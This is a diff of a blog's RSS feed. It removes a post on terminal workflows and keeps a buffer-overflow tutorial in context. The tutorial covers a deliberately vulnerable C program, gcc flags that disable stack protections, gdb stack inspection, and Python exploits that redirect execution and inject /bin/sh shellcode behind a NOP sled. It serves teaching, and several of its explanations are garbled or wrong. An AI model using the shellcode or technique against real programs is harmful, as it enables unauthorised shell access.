@@ -6,57 +6,8 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-GB</language>
         <copyright>&lt;a href=&#39;https://creativecommons.org/licenses/by/4.0/&#39; target=&#39;_blank&#39;&gt;CC-BY 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Wed, 07 Jul 2021 20:03:02 -0300</lastBuildDate>
+        <lastBuildDate>Mon, 10 Aug 2020 20:03:02 -0300</lastBuildDate>
         <atom:link href="https://darccau.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
-        
-        <item>
-            <title>Why use an terminal based workflow?</title>
-            <link>https://darccau.github.io/why-use-an-terminal-based-workflow/</link>
-            <pubDate>Wed, 07 Jul 2021 20:03:02 -0300</pubDate>
-            
-            <guid>https://darccau.github.io/why-use-an-terminal-based-workflow/</guid>
-            <description>Introduction My friends frequently asking me &amp;ldquo;why you use terminal as a place to development ?&amp;rdquo; this question motivate me to write about so many peaple prefer works on terminal than in a graphical user interface(GUI).
-Extensibility At the Beginning, we need to remenber the linux philosophy of extensibility. Once we are using an command line interface(CLI) tool on linux, we can integrate them with another allowing an developer create an intrincated chain of commands to perform an actions and also can create another chain of commands to filer the first one output.</description>
-            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
-<p>My friends frequently asking me &ldquo;why you use terminal as a place to
-development ?&rdquo; this question motivate me to write about so many peaple prefer
-works on terminal than in a graphical user interface(GUI).</p>
-<h2 id="extensibility">Extensibility</h2>
-<p>At the Beginning, we need to remenber the linux philosophy of extensibility.
-Once we are using an command line interface(CLI) tool on linux, we can
-integrate them with another allowing an developer create an intrincated chain
-of commands to perform an actions and also can create another chain of commands
-to filer the first one output.</p>
-<p>This kind of integration allow an developer that know what they are doing
-automate various tasks that in an GUI wouldn&rsquo;t be possible due to its
-inflexibility.</p>
-<h2 id="organization">Organization</h2>
-<p>In my opinion, it&rsquo;s one of the best points of working completetly on terminal.
-multiple terminal emulator or even another programs can split the terminal main
-window in multiple little terminals allowing one better visualization of
-multiple tasks beeing performed at the same time.</p>
-<p>In my opinion, the gretest example of it is the tmux that until divide de
-terminal in sessions, panes and sessions as show bellow:</p>
-<!-- raw HTML omitted -->
-<p>It' split terminal window, allow multiple terminal in the same window.</p>
-<!-- raw HTML omitted -->
-<p>Create new terminal window outside of the first one.</p>
-<!-- raw HTML omitted -->
-<p>Create sessions that comport the panes and splits above mentioned.</p>
-<h2 id="text-edition">Text edition</h2>
-<p>The terminal text editor are editors that work in it&rsquo;s own terminal, this
-editors are frequently used because they are weightless, had universal presence
-on unix like systems and not less importante, each of them had their own
-particularities.</p>
-<p>For this post, i&rsquo;ll only talk about <strong>VI</strong> like text editors, because i have
-more familiarity. <strong>VI</strong> is present by default in the biggest linux
-distributions, it&rsquo;s knowed to be much efficient during write process due
-keybindins configurations that allow an development processes without the use o
-mouse and custom movimentation. Even work on terminal the lastest version of this
-family of editors can use the most recently plugins of the GUI editors using
-the lSP servers.</p>
-]]></content>
-        </item>
         
         <item>
             <title>Buffer Overflow Exploitation</title>
@@ -70,7 +21,7 @@ For explain this vulnerability, i was prepered this vulnerable C code as you can
             <content type="html"><![CDATA[<h3 id="introduction">Introduction</h3>
 <p>Briefly, the buffer overflow is a vulnerability that occurs when a program writes more data than its buffer supports. And the data that exceeds the buffer size overwrite the program information.</p>
 <p>For explain this vulnerability, i was prepered this vulnerable C code as you can see below.</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#include &lt;stdio.h&gt;
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#include &lt;stdio.h&gt;
 
 
 void vuln(void)
@@ -96,7 +47,7 @@ int main(void)
         return 0;
 }
 </code></pre></div><p>Now we need to compile this program, some flags will be used to disable some file protections:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gcc vulnerable.c -o vulnerable -z -execstack -fno-stack-protector -no-pie -w
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gcc vulnerable.c -o vulnerable -z -execstack -fno-stack-protector -no-pie -w
 </code></pre></div><p>Brief explain about the flags:</p>
 <ul>
 <li><strong>execstack:</strong> Disable execution on the stack.</li>
@@ -106,14 +57,14 @@ int main(void)
 <p>That done, we have an executable file called &ldquo;vulnerable&rdquo;.</p>
 <p>The behavior of &ldquo;vulnerable&rdquo; is basically to print a message, get an input and print this input. This is illustrated below.
 <strong>Execution</strong></p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">~$ ./vulnerable
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">~$ ./vulnerable
 </code></pre></div><p><strong>Output</strong></p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Whats my name?
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Whats my name?
 AAAAAAAA
 You say: AAAAAAAA
 But it is not my real name!
 </code></pre></div><p>But, when this input is bigger than expected we got:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Whats my name?
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Whats my name?
 You say: AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH
 [1]    9337 segmentation fault (core dumped)  ./vulnerable
 </code></pre></div><p>Voilà, we got an unexpected behaviour.</p>
@@ -128,9 +79,9 @@ You say: AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH
 <p><strong>call</strong>: As a C function when called, this instruction goes to the address / label specified after its declaration. But not only that. when a function is called, it needs to return to its old scope for the program to end normally. Therefore, the address after the function call is stored in the stack, so that, at the end of the function, this address is at the top of the stack and it is possible to return this address to the register responsible for executing the program instructions (rip) so that the program continues its normal execution flow.</p>
 <p><strong>ret</strong>: An assembly instruction that takes the address at the top of the stack and places it in the rip.</p>
 <p>Now come to gdb, to understand the behavior of the program</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb vulnerable
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb vulnerable
 </code></pre></div><p>In console type:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">disassemble vuln
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">disassemble vuln
                             [ Disassemble main function ]
 
         0x00000000004011d8 &lt;+0&gt;:     endbr64
@@ -141,7 +92,7 @@ You say: AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH
         0x00000000004011ea &lt;+18&gt;:    pop    rbp
         0x00000000004011eb &lt;+19&gt;:    ret
 </code></pre></div><p>With this command, we obtained the assembly code for the &ldquo;main&rdquo; function. we can see that vuln function are called.</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">run
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">run
                                 [  Run program ]
 
         Whats my name?
@@ -150,7 +101,7 @@ You say: AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH
 
         Program received signal SIGSEGV, Segmentation fault.
 </code></pre></div><p>With this assert the program was executed in gdb context, in this exemple we will reproduce the unexpected behavior as before.</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">x/15gx $rsp
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">x/15gx $rsp
                                   [ Print STACK ]
 
         0x7fffffffd8f8: 0x4646464646464646      0x4747474747474747
@@ -164,7 +115,7 @@ x/gx $rsp
                 [ Top address of STACK ]
         0x7fffffffd8f8: 0x4646464646464646
 </code></pre></div><p>It is the dumping of part of the top of stack&rsquo;s. we can see that part of them are filled in by &ldquo;46, 47, 48&rdquo;. This represents part of the input sent to the program. But, these values are different from &ldquo;ABCDEFGH&rdquo; right? yes, but computationally, the letters are represented by numbers, we can verify when we look at the ascii table.</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">~$ man ascii
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">~$ man ascii
 </code></pre></div><table>
 <thead>
 <tr>
@@ -227,14 +178,14 @@ x/gx $rsp
 </table>
 <p>Comparing the table with the memory dump, is possible assert that part of the imput in hexadecimal is stored on stack. Considering that, and what we was learn about assembly and computer arquitechtures. we got that, the payload overwirete the top of stack, it means that rsp regiter appoint to 0x4646464646464646 what will make rip got an invalid memory adress and the message segmentfault is show.</p>
 <p>This illustration below show the stage of stack in normal flow.</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">                                      [STACK]
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">                                      [STACK]
                 Top of stack:    |return adress|  &lt;- rsp
                                  |     ...     |
                                  |   name[50]  |  &lt;- rbp
                                  |     ...     |
 </code></pre></div><p>When the ret instruction will be executed the &ldquo;return adress&rdquo; that represent the addres of &ldquo;return&rdquo; in the C used exemple will be put in the rip that will come back to main function and correctly finish the program.</p>
 <p>This represent the stack when the overflow was happen.</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">                                        [STACK]
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">                                        [STACK]
                 Top of stack:    |0x4444444444444444|  &lt;- rsp
                                  |0x4343434343434343|
                                  |0x4242424242424242|
@@ -244,26 +195,26 @@ x/gx $rsp
 </code></pre></div><p>Now remenber what will happen when the <strong>ret</strong> register will be executed, they will get the top address of the stack and will put it into <strong>rip</strong> to program follow the normal flow, but when the top address of stack is overwrited, the <strong>rip</strong> will recive the overwrite value in the above example (0x44444444), but it&rsquo;s an invalid address and the return a segmentfault fault message.</p>
 <p>But it is not the central problem, its behavior can be much more harmful than just crashing the application, if you can overwrite the address on the top of stack when the program are running the program will be able to take control of the program&rsquo;s execution flow, it may be possible to execute other parts of the code or arbitrarily execute commands, I will give examples.</p>
 <p>At first, we will change the execution flow of the program to execute &ldquo;real_name&rdquo; funtion. Instead, you replace the address on the top of stack in the end of &ldquo;vuln&rdquo; execution it means the address of &ldquo;return&rdquo; in C example, to letters or some other junk, we will put an valid address, like the &ldquo;real_name&rdquo; function, in the code example.</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Exploit.py
-</code></pre></div><div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">padding = &#34;A&#34; * 72
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Exploit.py
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">padding = &#34;A&#34; * 72
 overwirete_return_address = &#34;\x76\x11\x40\00\00\00\00\00&#34;
 print(padding + overwirete_return_address)
 </code></pre></div><p>Padding is the ammount of content that overwrite the buffer until before of top of stack.</p>
 <p>This &ldquo;overwirete_return_address&rdquo; represent the address that start the target function that we want to be executed(real_name), its possible find this address in objdump with:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">objdump -M intel -d vulnerable | grep -m 2 vuln
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">objdump -M intel -d vulnerable | grep -m 2 vuln
 </code></pre></div><p><strong>Output</strong></p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">vulnerable:
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">vulnerable:
 0000000000401176 &lt;vuln&gt;:
 </code></pre></div><p>Note that is necessary put the address in bakwards because of the processor follow the little endian notation.</p>
 <p><strong>Execution</strong></p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$HOME/file_path/vulnerable &lt; python2 exploit.py
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$HOME/file_path/vulnerable &lt; python2 exploit.py
 </code></pre></div><p><strong>Output</strong></p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Give me some input:
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Give me some input:
 You say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
 You are right, my name is Eduardo
 [1]    7836 segmentation fault (core dumped)
 </code></pre></div><p>The &ldquo;real_name&rdquo; did executed, but the danger can be amplified if you put an shellcode it means amount machine code instruction that return execute <strong><em>/bin/bash</em></strong> and you can take a shell in target machine. so go build the exploit.</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">padding = &#34;A&#34; * 72
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">padding = &#34;A&#34; * 72
 
 overwrite_return_address = &#34;Previous address to top stack&#34;
 
@@ -277,7 +228,7 @@ print(padding + overwrite_return_address + nops + shellcode)
 nop = &ldquo;\x90&rdquo; * 60</p>
 <p>shellcode = &lsquo;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&rsquo;</p>
 <p>print(padding + overwrite_return_address + nops + shellcode)</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
 This exploit i was make some modifications, now, the override_return_address represent de address after the overwrite address in stack, that will repoainto to stack segment, and remenber, we compile this binary with NX(no execstack) protection it means that stack can execute intructions. use the nop instructions, that make anything, to avoid stack unalligment problems(I pretend talk about it in another post).
 
 If all happened following the plain, the signal &#34;#&#34; or &#34;$&#34; in the terminal has been disaper. And you are a new shell.
